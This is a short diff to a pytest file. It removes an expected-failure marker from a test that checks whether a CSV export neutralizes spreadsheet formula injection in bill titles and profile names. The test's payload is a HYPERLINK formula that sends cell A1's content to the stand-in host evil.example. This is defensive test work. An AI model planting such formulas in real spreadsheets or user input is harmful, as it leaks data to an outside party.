@@ -180,12 +180,6 @@ def test_csv_newlines_in_cells_are_quoted(admin_client, db):
     assert body[0][header.index("title")] == 'ligne 1\nligne 2 "citée"'
 
 
-@pytest.mark.xfail(
-    strict=True,
-    reason="BUG: CSV formula injection: bill titles (public source data) and profile names "
-    "(user input) starting with = + - @ are exported as-is, so Excel evaluates them. "
-    "Expected: such cells neutralized (e.g. prefixed with an apostrophe).",
-)
 @pytest.mark.parametrize("prefix", FORMULA_PREFIXES)
 def test_csv_cells_are_protected_against_formula_injection(admin_client, db, prefix):
     payload = f'{prefix}HYPERLINK("https://evil.example/?x="&A1,"click")'
